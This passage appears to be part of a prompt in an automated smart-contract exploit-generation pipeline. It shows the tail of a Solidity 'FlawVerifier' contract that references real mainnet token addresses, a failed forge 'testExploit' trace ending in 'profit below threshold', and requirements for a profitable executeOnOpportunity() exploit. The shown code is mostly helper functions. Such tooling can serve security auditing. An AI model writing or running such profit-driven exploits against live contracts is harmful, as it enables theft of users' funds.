        _markPath(1);

        if (!_contains(currentRouters, currentRouters.length, spender)) {
            _markPath(3);
        }
    }

    function _markPath(uint256 index) internal {
        if (index < 256) {
            _coveredPaths |= (uint256(1) << index);
        }
    }

    function _isPathCovered(uint256 index) internal view returns (bool) {
        return ((_coveredPaths >> index) & 1) == 1;
    }

    function _bestObservedNarrative() internal view returns (string memory) {
        if (_isPathCovered(0) && _isPathCovered(1) && _isPathCovered(2) && _isPathCovered(3)) {
            return string.concat(PATH_0, " ", PATH_1, " ", PATH_2, " ", PATH_3);
        }
        if (_isPathCovered(0) && _isPathCovered(1) && _isPathCovered(2)) {
            return string.concat(PATH_0, " ", PATH_1, " ", PATH_2);
        }
        if (_isPathCovered(0) && _isPathCovered(1)) {
            return string.concat(PATH_0, " ", PATH_1);
        }
        if (_isPathCovered(0)) {
            return PATH_0;
        }
        return _path;
    }

    function _contains(address[] memory list, uint256 length, address candidate) internal pure returns (bool) {
        for (uint256 i = 0; i < length; i++) {
            if (list[i] == candidate) {
                return true;
            }
        }
        return false;
    }

    function _allowance(address token, address owner, address spender) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.allowance.selector, owner, spender)
        );
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        if (token.code.length == 0) {
            return 0;
        }
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _readUint(address target, bytes4 selector) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _callSucceeded(bool ok, bytes memory ret) internal pure returns (bool) {
        return ok && (ret.length == 0 || abi.decode(ret, (bool)));
    }

    function _defaultSeedAmount(address token) internal pure returns (uint256) {
        if (token == USDC) return 1_000_000;
        if (token == 0xdAC17F958D2ee523a2206206994597C13D831ec7) return 1_000_000;
        if (token == 0x6B175474E89094C44Da98b954EedeAC495271d0F) return 1e18;
        if (token == WETH) return 1e17;
        if (token == 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) return 10_000;
        if (token == 0x853d955aCEf822Db058eb8505911ED77F175b99e) return 1e18;
        return 1e18;
    }
}

```

forge stdout (tail):
```
Ee284F754E854890e311e3280b767F80797180d::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [246] 0xC8D26aB9e132C79140b3376a0Ac7932E4680Aa45::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [7509] 0xd92023E9d9911199a6711321D1277285e6d4e2db::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [268] 0x6299838C8254b59213eb56d158ebe562D23c4936::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [7487] 0x72Ce9c846789fdB6fC1f34aC4AD25Dd9ef7031ef::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [246] 0x52595021fA01B3E14EC6C88953AFc8E35dFf423c::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [202] 0x23Ddd3e3692d1861Ed57EDE224608875809e127f::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [202] 0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [20519] 0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [10134] 0x9BA6e03D8B90dE867373Db8cF1A58d2F7F006b3A::b7947262() [staticcall]
    │   │   │   ├─ [5307] 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F::b7947262() [delegatecall]
    │   │   │   │   ├─ [214] 0xd5D82B6aDDc9027B22dCA772Aa68D5d74cdBdF44::b7947262()
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   ├─ [168] 0x40E0C049f4671846E9Cff93AAEd88f2B48E527bB::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [5109] 0xaBA2c5F108F7E820C049D5Af70B16ac266c8f128::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [213] 0x14c1Bc7859fed4F49659C29231ad06ADbfc638D7::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [204] 0x10E6593CDda8c58a1d0f14C5164B376352a55f2F::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [7500] 0xC5b1EC605738eF73a4EFc562274c1c0b6609cF59::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [226] 0x1EE116B869eCc7cd13C629a8a2Ae39Fa361265CF::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [234] 0x5427FEFA711Eff984124bFBB1AB6fbf5E3DA1820::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [225] 0x3666f603Cc164936C1b87e207F36BEBa4AC5f18a::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [225] 0x3E4a3a4796d16c0Cd582C382691998f7c06420B6::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [225] 0x22B1Cbb8D98a01a3B71D034BB899775A76Eb1cc2::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [225] 0x3d4Cc8A61c7528Fd86C55cfe061a78dCBA48EDd1::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [224] 0xb8901acB165ed027E32754E0FFe830802919727f::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [225] 0xb98454270065A31D71Bf635F6F7Ee6A518dFb849::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [180] 0x92e929d8B2c8430BcAF4cD87654789578BB2b786::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Stop]
    ├─ [371] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xd5D82B6aDDc9027B22dCA772Aa68D5d74cdBdF44
  at 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F
  at 0x9BA6e03D8B90dE867373Db8cF1A58d2F7F006b3A
  at 0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1.balanceOf
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.15s (1.05s CPU time)

Ran 1 test suite in 1.18s (1.15s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2483954)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
